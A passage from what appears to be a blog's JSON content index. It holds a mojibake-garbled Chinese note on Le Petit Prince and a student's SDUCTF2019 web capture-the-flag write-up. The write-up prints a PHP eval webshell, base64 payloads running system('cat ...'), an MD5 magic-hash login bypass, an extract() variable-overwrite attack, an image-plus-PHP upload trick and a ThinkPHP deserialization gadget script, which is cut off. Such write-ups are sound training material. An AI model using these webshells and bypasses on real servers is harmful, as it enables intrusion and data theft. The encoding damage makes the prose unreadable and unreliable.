å¯æƒœä»å‰æˆ‘ä»€ä¹ˆéƒ½ä¸æ‡‚ï¼æˆ‘åº”è¯¥çœ‹ç€å¥¹çš„è¡ŒåŠ¨ï¼Œè€Œä¸æ˜¯å¬å¥¹çš„è¨€è¯­ï¼å¥¹ä¸ºæˆ‘æ•£å‘èŠ¬èŠ³ï¼Œç‚¹äº®æˆ‘çš„ç”Ÿæ´»ã€‚æˆ‘ä¸åº”è¯¥ç¦»å¼€å¥¹çš„ï¼Œæˆ‘åº”è¯¥çœ‹å‡ºè—åœ¨å¥¹é‚£äº›åé¢çš„æŸ”æƒ…ã€‚èŠ±å„¿çš„å¿ƒäº‹å¥½éš¾æ‰æ‘¸çš„ï¼å½“æ—¶æˆ‘å¤ªå°äº†ï¼Œä¸æ‡‚å¾—çˆ±æ˜¯ä»€ä¹ˆã€‚\n  â€œé‚£ä½ å¯ä»¥å®¡åˆ¤è‡ªå·±ï¼Œâ€å›½ç‹å›ç­”è¯´ï¼Œâ€œè¿™æ˜¯æœ€éš¾çš„ã€‚å®¡åˆ¤è‡ªå·±æ¯”å®¡åˆ¤åˆ«äººéš¾å¾—å¤šã€‚å¦‚æœä½ èƒ½æ­£ç¡®åœ°å®¡åˆ¤è‡ªå·±ï¼Œé‚£ä½ å°±æ˜¯çœŸæ­£çš„èªæ˜äººâ€ã€\n  çœ‹ä¸œè¥¿åªæœ‰ç”¨å¿ƒæ‰èƒ½çœ‹å¾—æ¸…æ¥šï¼Œé‡è¦çš„ä¸œè¥¿ç”¨çœ¼ç›çœ‹ä¸è§çš„ã€‚\n  æ­£æ˜¯ä½ ä¸ºä½ çš„ç«ç‘°ä»˜å‡ºçš„æ—¶é—´ï¼Œä½¿å¾—ä½ çš„ç«ç‘°æ˜¯å¦‚æ­¤çš„é‡è¦ã€‚\n  ","description":"","tags":[],"title":"Le Petit Prince Note","uri":"/posts/le-petit-prince-note/"},{"categories":["ctf"],"content":"SDUCTF2019-WriteUp åˆšå…¥é—¨äº†ctf2å‘¨ï¼Œä¾¿æœ‰æ–°ç”Ÿèµ›ç©ï¼ŒçœŸå¥½ã€‚\nPS.åˆšå‡†å¤‡å†™wpåˆæ”¾å‡ºæ¥ä¸€é¢˜QAQ\nï¼ï¼ï¼å†™wpä¸€åŠåˆæ”¾å‡ºé¢˜ç›®\nè¯´å¥½çš„å‘¨å…­æ—©ä¸Šæ”¾é¢˜çš„ï¼Œç»“æœæ—©ä¸Šèµ·æ¥ä¸€è„¸æ‡µé€¼\næ ¡å›­ç½‘ä¸‹pwntoolsä¸‹åˆ°å´©æºƒå•Šå•Šå•Šå•Šå•Š\nWeb 0x01 æœ€ç®€ç­”çš„Webé¢˜  é¢˜ç›®æè¿°ï¼šflagå°±åœ¨htmlé‡Œé¢ï¼Œå³é”®ç‚¹å‡»æŸ¥çœ‹æºä»£ç å³å¯æŸ¥çœ‹\n ç›´æ¥F12æŸ¥çœ‹æºç ï¼Œæ‰¾åˆ°flag\n0x02 æŒ‰é’®ç‚¹å‡»  é¢˜ç›®æè¿°ï¼š æƒ³æ–¹è®¾æ³•ç‚¹å‡»æŒ‰é’®\n è¿›å…¥é¡µé¢ä¸€ä¸ªç°è‰²çš„æŒ‰é’®ï¼ŒF12æŸ¥çœ‹æºç \nåˆ é™¤buttonæ ‡ç­¾é‡Œçš„disabledå³å¯ç‚¹å‡»æŒ‰é’®\n1  \u003cinput style=\"width: 150px; height: 60px; font-size: 30px;\" type=\"button\" onclick=\"c()\" value=\"flag\" disabled=\"\"\u003e   åé¢å¥½å¥‡ï¼Œå‘ç°flagå°±åœ¨click2.jsé‡Œï¼Œè¢«base64åŠ å¯†è¿‡\n0x03 é‡å­æ³¢åŠ¨é€Ÿè¯»  é¢˜ç›®æè¿°ï¼š ä½ ä¼šé‡å­æ³¢åŠ¨é€Ÿè¯»å—ï¼Ÿ\n è¿›å…¥é¡µé¢å°±ä¸€ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»æŸ¥çœ‹ï¼Œå‘ç°ä¸€é—ªè€Œè¿‡çš„fakeflag\n1 2 3  \u003cbutton onclick=\"window.location.href = 'flag_is_here.html'\"\u003e ç‚¹å‡»æŸ¥çœ‹flag \u003c/button\u003e   æºç å¦‚ä¸Šï¼Œè¾“å…¥url/flag_is_here.htmlå‘ç°å°±æ˜¯åˆšæ‰ä¸€é—ªè€Œè¿‡çš„é¡µé¢\nåˆ©ç”¨burpsuiteæŠ“åŒ…å³å¯ï¼Œå› ä¸ºæ‰€æœ‰è¯·æ±‚è¢«burpsuiteæ‹¦æˆªï¼Œæ‰€ä»¥å¯ä»¥çœ‹åˆ°/flag_is_here.htmlä½†æ˜¯é¡µé¢ä¸Šç»™çš„æ˜¯fake ctfï¼Œæ˜æ˜¾ä¸æ˜¯flagï¼ŒæŸ¥çœ‹æºç å¾—åˆ°flagï¼Œæˆ‘æ˜¯ç›´æ¥ç”¨repeaterå‘ä¸€ä¸ªåŒ…è·å¾—Responseã€‚\n0x04 èŠéº»å¼€é—¨  é¢˜ç›®æè¿°ï¼š ç®€å•çš„æäº¤ï¼ŒèŠéº»å¼€é—¨\n ç›´æ¥å¤åˆ¶é¢˜ç›®çš„zhimakaimenè¿›å»ï¼Œè¿”å›çš„æ˜¯å£ä»¤é”™è¯¯\næŸ¥çœ‹burpsuiteæ‹¦æˆªçš„åŒ…ï¼Œå¥½åƒæ˜¯å› ä¸ºä»–çš„è¾“å…¥æ¡†æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥å°‘äº†ä¸€ä¸ªå­—æ¯\nåˆ©ç”¨burpsuiteçš„repeateré‡æ–°å‘ä¸€ä¸ªå®Œæ•´çš„åŒ…ï¼Œå¾—åˆ°flag\n0x05 Funny Button  é¢˜ç›®æè¿°ï¼š æœ‰è¶£çš„æŒ‰é’®ï¼Œä½ èƒ½ç‚¹åˆ°å—ï¼Ÿ\n å³ç¤ºä¾‹çš„é¢˜ç›®ï¼Œåˆ é™¤htmlçš„cssæˆ–jséƒ½å¯ä»¥ï¼Œç”šè‡³å¯ä»¥ç”¨tabé”®é€‰ä¸­buttonæŒ‰é’®ï¼Œç‚¹å‡»å»å°±æ˜¯flag\n0x06 æ›²å¥‡  é¢˜ç›®æè¿°ï¼š ä½ å–œæ¬¢åƒæ›²å¥‡é¥¼å¹²å—ï¼Ÿ\n æ›²å¥‡==cookiesï¼Œç›´æ¥æŸ¥çœ‹ç½‘ç«™cookieså³å¯\nflagå³åœ¨å†…å®¹é‡Œï¼Œæ³¨æ„flagè¦è¿›è¡Œurlè§£ç \n0x07 GET  é¢˜ç›®æè¿°ï¼š ä½ å°±æ˜¯ä¸ªæ²¡æœ‰æ„Ÿæƒ…çš„æµè§ˆå™¨\n æˆ‘æ˜¯ä¸€ä¸ªè«å¾—æ„Ÿæƒ…çš„getæœºå™¨\n0x08 æœªæ¥æµè§ˆå™¨  é¢˜ç›®æè¿°ï¼š å°ç‹æ­£åœ¨è¿½å‰§ã€Šäº²çˆ±çš„ï¼Œçƒ­çˆ±çš„ã€‹ï¼Œç”µè„‘å±å¹•ã€‚ã€‚ã€‚ã€‚ï¼ˆè°å¸®æˆ‘ç¼–ä¸ªï¼‰ å½“ä»–å†æ¬¡é†’æ¥ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚\n æœ‰é¢˜ç›®å·²çŸ¥ï¼Œç”¨burpsuiteæ”¹httpå¤´å±æ€§User-Agentå³å¯\n1  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/6666.6.6666.66 Safari/537.36   æ”¹åå‘åŒ…å¾—åˆ°flag\n0x09 POST  é¢˜ç›®æè¿°ï¼š ä½ å°±æ˜¯ä¸€ä¸ªæ²¡æœ‰æ„Ÿæƒ…çš„æµè§ˆå™¨\n æˆ‘åªæ˜¯ä¸€ä¸ªè«å¾—æ„Ÿæƒ…çš„postæœºå™¨\nåˆ©ç”¨firefoxæ’ä»¶HackBarå‘é€postè¯·æ±‚ï¼Œæˆ–è€…ç”¨burpsuiteä¹Ÿè¡Œ\n0x0a vimå¥½ç”¨å•Š  é¢˜ç›®æè¿°ï¼š å°æ˜åŒå­¦ç”¨vimç¼–è¾‘ä¸»é¡µçš„æ—¶å€™ï¼Œå®éªŒå®¤æ–­ç”µäº†ï¼\n ç”±é¢˜ç›®å¾—çŸ¥ç”¨vimæ—¶æ–­ç”µï¼Œç”¨è¿‡vimçš„äººéƒ½çŸ¥é“ï¼Œå½“viméæ­£å¸¸é€€å‡ºæ—¶ä¼šåˆ›å»ºä¸€ä¸ªä¿æŠ¤çš„ç¼“å­˜æ–‡ä»¶ï¼Œç°åœ¨wordä¹Ÿä¸€æ ·ã€‚\nç›´æ¥ç™¾åº¦æœvimå¼‚å¸¸é€€å‡ºçš„å¤‡ä»½æ–‡ä»¶ï¼Œå› ä¸ºä¸Šæ¬¡åšè¿‡ç±»ä¼¼çš„ï¼Œè¯•è¯•index.php.bakå’Œindex.php~æ²¡ç”¨ï¼Œå°±ç™¾åº¦äº†ä¸€ä¸‹ï¼Œå¾—çŸ¥å¤‡ä»½æ–‡ä»¶æ ¼å¼ä¸º.index.php.swpï¼Œè®¿é—®url/.index.php.swpä¸‹è½½æ–‡ä»¶å¾—åˆ°.index.php.swp\nå¾—çŸ¥flagåœ¨url/vimvimvimvim.phpé‡Œï¼Œæœç„¶vimæ˜¯æœ€å¥½çš„ç¼–è¾‘å™¨ï¼ˆç‹—å¤´ä¿å‘½\n0x0b ä¸€å¥è¯æœ¨é©¬  é¢˜ç›®æè¿°ï¼š å¬è¯´è¿‡ä¸€å¥è¯æœ¨é©¬å—ï¼Ÿ å¬è¯´è¿‡ä¸­å›½èœåˆ€å—ï¼Ÿ å¬è¯´è¿‡ä¸­å›½èšå‰‘å—ï¼Ÿ å¿«å»äº†è§£ä¸€ä¸‹å§ï¼ï¼\n çœ‹åˆ€\u003c!--php eval(@$_POST[\"cmd\"]);--\u003eå°±å¯çŸ¥æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œå¯¹è¿™ä¸ªç¨å¾®äº†è§£ä¸€ä¸‹ï¼Œå»githubè·å–ä¸­å›½èšå‰‘å³å¯\nä¸è¿‡æœ‰ä¸€ä¸ªå‘ï¼Œå°±æ˜¯ä»–é»˜è®¤è®¿é—®æ˜¯index.phpï¼Œä½†æ˜¯é€šè¿‡ä¸­å›½èšå‰‘è¿ä¸ä¸Šï¼Œå›å¤´çœ‹é¡µé¢ï¼Œå‘ç°åœ¨é¢˜ç›®ä¸­æœ‰ä¸€ä¸ªshell.phpï¼Œäºæ˜¯å°è¯•url/shell.phpåŠ ä¸Šå¯†ç cmdï¼ŒæˆåŠŸè¿ä¸Šå¾—åˆ°flag\n0x0c è¾¾æ‹‰å´©å§  é¢˜ç›®æè¿°ï¼š è¾¾æ‹‰å´©å§æ‰“æ€ªå°æ¸¸æˆ\n è¿›å…¥é¡µé¢æ˜¯ä¸ªå°æ¸¸æˆï¼Œå‘ç°æ˜¯hackergame2019åŸé¢˜å˜¤å˜¤å˜¤\nåŸé¢˜wpï¼š https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E8%BE%BE%E6%8B%89%E5%B4%A9%E5%90%A7%E5%A4%A7%E5%86%92%E9%99%A9/README.md\nåœ¨ä¹°èœè¿™é‡Œï¼Œæœ‰ä¸€ä¸ªå¤§æ•´æ•°æº¢å‡ºï¼Œåç»­ä¼šææ‡‚è¿™ä¸ªåŸç†\nåŸç†å¦‚ä¸‹ï¼š https://blog.csdn.net/zhenghhgz/article/details/78657917\n åŸæ„æ˜¯javascriptçš„æ‰€æœ‰æ•°å­—ï¼Œæ— è®ºæ•´æ•°è¿˜æ˜¯å°æ•°ï¼Œç±»å‹éƒ½ä¸ºNumberï¼Œä¸º64ä½æµ®ç‚¹æ•°ã€‚å› æ­¤ï¼ŒJavaScriptä¸­æ‰€æœ‰çš„æ•°éƒ½æ˜¯æµ®ç‚¹æ•°ã€‚éµå¾ªIEEE 754æ ‡å‡†ï¼ˆæµ®ç‚¹æ•°ç®—æœ¯æ ‡å‡†ï¼‰ï¼ŒJavaScriptæ‰€èƒ½è¡¨ç¤ºçš„æ•°å€¼èŒƒå›´ä¸ºæ­£è´Ÿ1.7976931348623157ä¹˜ä»¥10çš„308æ¬¡æ–¹ï¼Œå…¶æœ€å°æ‰€èƒ½è¡¨ç¤ºçš„å°æ•°ä¸ºæ­£è´Ÿ5ä¹˜ä»¥10çš„è´Ÿ324æ¬¡æ–¹ï¼Œè¿™ä¸¤ä¸ªè¾¹ç•Œå€¼å¯ä»¥åˆ†åˆ«é€šè¿‡è®¿é—®Numberå¯¹è±¡çš„MAX_VALUEå±æ€§å’ŒMIN_VALUEå±æ€§æ¥è·å–ã€‚\nJavaScriptèƒ½è¡¨ç¤ºå¹¶è¿›è¡Œç²¾ç¡®ç®—æœ¯è¿ç®—çš„æ•´æ•°èŒƒå›´ä¸ºï¼šæ­£è´Ÿ2çš„53æ¬¡æ–¹ï¼Œä¹Ÿå³ä»æœ€å°å€¼-9007199254740992åˆ°æœ€å¤§å€¼+9007199254740992ä¹‹é—´çš„èŒƒå›´ï¼›å¯¹äºè¶…è¿‡è¿™ä¸ªèŒƒå›´çš„æ•´æ•°ï¼ŒJavaScriptä¾æ—§å¯ä»¥è¿›è¡Œè¿ç®—ï¼Œä½†å´ä¸ä¿è¯è¿ç®—ç»“æœçš„ç²¾åº¦ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºæ•´æ•°çš„ä½è¿ç®—ï¼ˆæ¯”å¦‚ç§»ä½ç­‰æ“ä½œï¼‰ï¼ŒJavaScriptä»…æ”¯æŒ32ä½æ•´å‹æ•°ï¼Œä¹Ÿå³ä»-2147483648åˆ°+2147483647ä¹‹é—´çš„æ•´æ•°ã€‚\n ç„¶åå¾—åˆ°flag\n0x0d HTTPå¤´  é¢˜ç›®æè¿°ï¼š ä½ äº†è§£httpå¤´å—ï¼Ÿ\n æ ¹æ®é¢˜ç›®ï¼Œç›´æ¥æŸ¥çœ‹http Response Headers\nå¾—åˆ°flagï¼šF1ag: flag{096b5778-cf23-4f03-8c45-2505b7670b89}\n0x0e robots  é¢˜ç›®æè¿°ï¼š ä½ å¬è¯´è¿‡robotsåè®®å—ï¼Ÿ ä»–å¯æ˜¯æ¯ä¸ªæœºå™¨äººéƒ½éœ€è¦éµå®ˆçš„åè®®å•Šï¼ï¼ˆç¬‘è¯ï¼‰\n ç”±é¢˜ç›®çŸ¥ï¼Œrobotsæ˜¯ä¸€ä¸ªé™åˆ¶çˆ¬è™«çš„ä¸œè¥¿ï¼Œç›´æ¥è®¿é—®url/robots.txt\nUser-agent: * Disallow: / Disallow: f1ag_1s_h3re.php å¾—åˆ°å¦‚ä¸Šé¡µé¢ï¼Œè®¿é—®url/f1ag_1s_h3re.phpï¼Œå¾—åˆ°flag\n0x0f ä½ çš„IPä¸å¤ªå¯¹  é¢˜ç›®æè¿°ï¼šå°ä¼™è®¡ï¼Œä½ çš„IPä¸å¤ªå¯¹å•Š è¿™ä¸ªç½‘ç«™å¯ä¸æ˜¯ä»»ä½•ipéƒ½èƒ½è®¿é—®çš„\n ç”±é¢˜ç›®å¯çŸ¥ï¼Œéœ€è¦æ”¹ipæˆ111.111.111.111è®¿é—®ï¼Œæ˜“çŸ¥æ˜¯XFFä¼ªé€ \nåˆ©ç”¨burpsuiteæŠ“åŒ…ï¼Œåœ¨headeré‡ŒåŠ ä¸ŠX-Forwarded-For:111.111.111.111å³å¯ï¼Œå‘é€åŒ…ï¼Œå¾—åˆ°flag\n0x10 ç™»å½•  é¢˜ç›®æè¿°ï¼š å°ç‹åšäº†ä¸€ä¸ªç½‘ç«™éœ€è¦ç™»å½•ï¼Œä½†æ˜¯éªŒè¯è²Œä¼¼æœ‰ç‚¹æ¼æ´\n è¿›å…¥é¡µé¢ä¹‹åå‘ç°buttonæ˜¯æ²¡æœ‰ç”¨çš„ï¼ŒF5åˆ·æ–°ä¹‹åæŠ“åŒ…ï¼Œå‘ç°æœ‰ä¸€ä¸ªcookie\nå°è¯•å°†Cookieæ”¹æˆCookie: Login=1ï¼Œå‘ç°æˆåŠŸå¾—åˆ°flagåœ¨buttonä¸Š\n0x11 ç ´è§£md5  é¢˜ç›®æè¿°ï¼š md5æ˜¯åšä¸å¯ç ´çš„ï¼Œæ˜¯çœŸçš„å—ï¼Ÿ\n è¿›å…¥é¡µé¢ä¹‹åç›´æ¥æŸ¥çœ‹æºç ï¼Œå¦‚é¢˜ç›´æ¥ç™¾åº¦æœç´¢php MD5æ¼æ´ã€‚\n å¼•è‡ªï¼š https://blog.csdn.net/qq_19980431/article/details/83018232\n 1 2 3 4 5 6 7 8 9  \u003c!-- if (isset($_GET['a']) and isset($_GET['b'])) { if ($_GET['a'] != $_GET['b']) if (md5($_GET['a']) == md5($_GET['b'])) die('Flag: '.$flag); else print 'Wrong.'; } --\u003e   è‹¥è¦æ±‚æ»¡è¶³ä¸Šè¿°æ¡ä»¶åˆ™ é‚£ä¹ˆè¦æ±‚nameå’Œpasswordæ•°å€¼ä¸åŒä½†æ˜¯MD5ç›¸åŒï¼Œåœ¨è¿™é‡Œå¯ä»¥åˆ©ç”¨ç»•è¿‡ã€‚ PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€œ0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€œ0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚\n ä»¥ä¸‹å€¼åœ¨md5åŠ å¯†åä»¥0Eå¼€å¤´ï¼š\n QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a  ä»¥ä¸‹å€¼åœ¨sha1åŠ å¯†åä»¥0Eå¼€å¤´ï¼š\n sha1(â€˜aaroZmOkâ€™) sha1(â€˜aaK1STfYâ€™) sha1(â€˜aaO8zKZFâ€™) sha1(â€˜aa3OFF9mâ€™)   ç›´æ¥ä¼ å…¥url/?a=QNKCDZO\u0026b=240610708ï¼Œå¾—åˆ°flag\n0x12 phpæ˜¯æœ€å¥½çš„è¯­è¨€  é¢˜ç›®æè¿°ï¼š phpæ˜¯æœ€å¥½çš„è¯­è¨€?\n è¿›å…¥é¡µé¢å¦‚ä¸Šå›¾ï¼Œç‚¹å‡»æŸ¥çœ‹source.php\n1 2 3 4 5 6 7 8 9 10 11 12  \u003c?php if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") { $flag=\"flag{this_is_flag}\"; $pass=\"\"; $thepassword_123=\"ä¸å‘Šè¯‰ä½ \"; extract($_POST); } ?\u003e\u003cdiv\u003e \u003cp\u003e\u003c?php if ($pass == $thepassword_123) { echo $flag;} else {echo \"ha,ä½ æ°¸è¿œçŒœä¸åˆ°\";} ?\u003e\u003c/p\u003e \u003c/div\u003e   å¾—åˆ°phpæºç ï¼Œç™¾åº¦php extractå‡½æ•°ï¼Œå¾—çŸ¥extract()æœ‰ä¸ªå˜é‡è¦†ç›–æ¼æ´\nç”±phpæºç å¾—çŸ¥æ‰€æœ‰å˜é‡åï¼Œç›´æ¥å‡ºå…¥postå‚æ•°pass=\u0026thepassword_123=\nå¾—åˆ°flag\n0x13 ä¸€å¥è¯æœ¨é©¬2  é¢˜ç›®æè¿°ï¼š åœ¨ç°å®ä¸–ç•Œä¸­ï¼Œæœ€åŸå§‹çš„ä¸€å¥è¯æœ¨é©¬å¾€å¾€ä¼šè¢«wafç»™æ‹¦æˆªï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¸€èˆ¬ä¼šè¿›è¡Œç¼–ç æˆ–è€…åŠ å¯†ã€‚ è¿™é‡Œä½¿ç”¨æœ€ç®€å•çš„ç¼–ç ï¼Œä½ èƒ½æˆåŠŸåˆ©ç”¨è¿™ä¸ªåé—¨å—ï¼Ÿ\n è¿›å…¥ç½‘é¡µæŸ¥çœ‹æºç \nç™¾åº¦å¾—çŸ¥wafæ˜¯Web Application Firewallçš„ç®€ç§°ã€‚\nè¿™é¢˜åº”è¯¥æ˜¯è¦ç»•è¿‡wafï¼Œè¿›è¡Œè·å–webshell\nç”±\u003c!--php @eval(@base64_decode($_POST[\"cmd\"])); --\u003eå’Œé¢˜ç›®shell.phpå¾—çŸ¥ï¼šå®åœ¨shell.phpæ‰§è¡Œä¸€å¥è¯æœ¨é©¬\n system('ls'); base64\u003e\u003e\u003ec3lzdGVtKCdscycpOw== system('cat ffffllllaaaagggg') base64\u003e\u003e\u003ec3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw== æ³¨ï¼šåˆ«åœ¨ç½‘é¡µä¸­è§£base64ï¼Œä¸åŒç½‘é¡µä¹Ÿè®¸ä¼šå°†å­—ç¬¦ä¸²å…ˆurlç¼–ç æˆ–è€…Unicodeç¼–ç åœ¨è¿›è¡Œbase64åŠ å¯†ï¼Œç›´æ¥ç”¨burpsuiteå¸¦çš„base64encodeï¼Œç„¶åå‘åŒ…å³å¯\nå¾—çŸ¥flagåœ¨åŒç›®å½•ä¸‹çš„ffffllllaaaaggggé‡Œ\nå¾—åˆ°flag\n0x14 æ‹¼æ‰‹é€Ÿ  é¢˜ç›®æè¿°ï¼š ä½ å°±æ˜¯ä¸ªæ²¡æœ‰æ„Ÿæƒ…çš„æµè§ˆå™¨ï¼Œä½†æ˜¯ä½ çš„æ‰‹é€Ÿå¤Ÿå¿«å—ï¼Ÿ\n è¿›å…¥é¡µé¢\nå¦‚é¢˜ï¼Œæäº¤getè¯·æ±‚url/?first=cyber\nå¦‚é¢˜ï¼Œæäº¤postè¯·æ±‚sceond=ansï¼ˆå› ä¸ºè®¡ç®—å¼æ¯æ¬¡éƒ½ä¼šå˜ï¼Œæ‰€ä»¥æˆ‘è¿™ç”¨ansæ›¿ä»£ï¼Œä¸è¿‡ä¹Ÿæ²¡å…³ç³»ï¼Œå¾—åˆ°å¦‚ä¸‹é¡µé¢\nå› ä¸ºæ¯æ¬¡åˆ·æ–°geté¡µé¢æ˜¯è®¡ç®—å¼éƒ½ä¼šå˜ï¼Œæ‰€ä»¥æˆ‘æƒ³åˆ°äº†ç”¨pythonçš„requestsçš„åº“ï¼Œè„šæœ¬å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  import requests import re url = \"http://url/?first=cyber\" reflag = '\\d\\*\\d\\+\\d\\*\\d' def qa(): r1 = requests.get(url) print(r1.text) r2 = re.search(reflag,r1.text) print(r2.group()) ans = eval(r2.group()) print(ans) ck = str(r1.cookies) pd = re.search('PHPSESSID=.* for',ck) pd = pd.group().split(' for')[0] print(pd) header = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Cookie\":pd, \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\" } data = {\"second\":ans} print(header) r4 =requests.post(url,headers=header,data=data) print(r4) print(r4.text)#flag return r4 aa = qa() #print(aa)   è·‘å‡ºæ¥ç»“æœå¦‚ä¸‹ï¼Œå¾—åˆ°flag\n0x15 ä¿¡æ¯æ³„éœ²  é¢˜ç›®æè¿°ï¼š ä¿¡æ¯æ³„éœ²äº†ï¼Œå¿«æ‹¿åˆ°å®ƒ\n çŒœæ˜¯php+Gitæ³„éœ²ï¼Œå‚è€ƒå¦‚ä¸‹æ–‡ç« ï¼Œè®¿é—®http://url/.git/HEADï¼Œæœç„¶ä¸‹è½½äº†HEADæ–‡ä»¶\næ–‡ä»¶é‡Œå†™ç€ï¼šref: refs/heads/masterï¼ŒæŒ‰å¦‚ä¸‹æ–‡ç« æå–äº†è®¿é—®url/refs/heads/masterï¼Œæå–äº†masteré‡Œçš„æ–‡ä»¶ï¼š985e6ce910e4cffa9957cf88fd9ac28c13654d6c\n https://www.jianshu.com/p/0ea09975169d\nhttps://www.cnblogs.com/xhds/p/10884647.html\n ç„¶åå‘ç°GitHackä¸€æ³¢å°±å¾—åˆ°flagäº†emmmmmmmm\n0x16 webå›¾åºŠ  é¢˜ç›®æè¿°ï¼š å›¾åºŠå¼€å‘ä¸­ï¼Œå…ˆæ”¾å‡ºæ¥ç»™ä½ ä»¬ç©ä¸€ä¸‹\n è¿›å…¥å‘ç°æ˜¯ä¸€ä¸ªç™»é™†ç½‘é¡µï¼Œæƒ³è¦æ³¨å…¥å´æ˜¯ç™»é™†å¤±è´¥ï¼Œé‚£å°±æ³¨å†Œä¸€ä¸ªè¯•è¯•\næ³¨å†Œåç™»é™†è¿›å»ï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥ä¸Šä¼ å›¾ç‰‡çš„ç½‘é¡µï¼Œå…¶ä»–å•¥ä¸œè¥¿ä¹Ÿæ²¡æœ‰ï¼Œæ¨æµ‹æ˜¯ç”¨å›¾ç‰‡åšä¸€å¥è¯æœ¨é©¬\n1  copy\ta.png/b+1.php t.png   ä½†æ˜¯å‘ç°ä¸Šä¼ ä¸Šå»ä¹‹åè¿”å›çš„æ˜¯å°±æ˜¯å›¾ç‰‡ï¼Œæ”¹åç¼€ä¹Ÿæ— æ³•è®¿é—®å…¶phpæ–‡ä»¶\näºæ˜¯å°è¯•äº†å„ç§å›¾ç‰‡ä¸€å¥è¯æœ¨é©¬çš„å¯èƒ½ï¼Œæ¯”å¦‚æˆªæ–­ï¼ŒæŠ“åŒ…æ”¹åç¼€ï¼Œå‘ç°æœåŠ¡å™¨åªæ¥å—å›¾ç‰‡æ–‡ä»¶ï¼Œè€Œä¸”æ— è®ºæ˜¯ä»€ä¹ˆæ ¼å¼çš„å›¾ç‰‡ä¼šè¢«æ”¹æˆpngæ ¼å¼è¿›è¡Œå‘ˆç°ï¼Œè€Œä¸”ä¸èƒ½ä¸Šä¼ å…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚\nå…¶ä¸­ä¸­é—´ç½‘é¡µè²Œä¼¼å´©äº†ä¸€ä¸‹ï¼Œçœ‹åˆ°æ˜¯ThinkPHP V5.1 ï¼Œç™¾åº¦æœå…¶æ¼æ´ï¼Œå‘ç°ä¹Ÿæ²¡æ³•å®ç°\nå…¶å±•ç¤ºçš„åé¢è§£md5å¾—åˆ°æ˜¯172.2.0.2ï¼Œæƒ³ç€å†…ç½‘åœ°å€ä¹Ÿæ²¡å¾—è®¿é—®ï¼Œåé¢è·Ÿç€ä¹Ÿæ˜¯æ–‡ä»¶çš„MD5å€¼\nIndex of /upload/fd40c7f4125a9b9ff1a4e75d293e3080/ MD5(172.2.0.2) = fd40c7f4125a9b9ff1a4e75d293e3080 æŠ“åŒ…çœ‹Cookieè§£æä¹‹åï¼Œæƒ³æ”¹Cookieå…¶ä¸­çš„æ–‡ä»¶åç¼€ä¹Ÿæ²¡ç”¨ã€‚\nåé¢å®åœ¨æ²¡æ€è·¯äº†ï¼Œå°±æ‰“ç®—å¯¹ç½‘ç«™è¿›è¡Œä¸€æ³¢è·¯å¾„æ‰«æï¼Œç»“æœå‘ç°äº†æƒŠå–œï¼Œæœ‰ä¸€ä¸ªwww.tar.gzï¼Œè®¿é—®ä¸‹è½½æ–‡ä»¶ï¼Œå‘ç°å°±æ˜¯phpæºç äº†ã€‚\nä¸è¿‡æˆ‘è¿˜æ²¡åˆ°èƒ½å®Œå…¨å®¡è®¡phpæºç çš„é«˜åº¦ï¼Œæˆ‘å°±å°†å…¶ä¸­ä¸€éƒ¨åˆ†çš„æºç å–ç”¨ç™¾åº¦æœç´¢ï¼Œæœç„¶æœåˆ°äº†åŸé¢˜\n https://www.freebuf.com/column/205789.html\nhttps://blog.csdn.net/qq_26406447/article/details/90671853\nhttps://www.zhaoj.in/read-5873.html\n é€šè¿‡PHPååºåˆ—åŒ–ï¼Œå¾—åˆ°cookieå»ä½¿æ–‡ä»¶è½¬åŒ–æ—¶ï¼Œè§£ææˆphpã€‚\nphpå‘åºåˆ—å·ç¨‹åºå¦‚ä¸‹ï¼Œç”¨ç”Ÿæˆçš„ç»“æœæ›¿æ¢å·²æœ‰çš„Cookieå³å¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  \u003c?php namespace app\\web\\controller; class Profile { public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) { return $this-\u003eexcept[$name]; } public function __call($name, $arguments) { if($this-\u003e{$name}){ $this-\u003e{$this-\u003e{$name}}($arguments); } } } class Register { public $checker; public $registed; public function __destruct() { if(!$this-\u003eregisted){ $this-\u003echecker-\u003eindex(); } } } $profile = new Profile(); $profile-\u003eexcept = ['index' =\u003e 'img']; $profile-\u003eimg = \"upload_img\"; $profile-\u003eext = \"png\"; $profile-\u003efilename_tmp = \"../public/upload/md5(user)/md5(filename).png\"; $profile-\u003efilename = 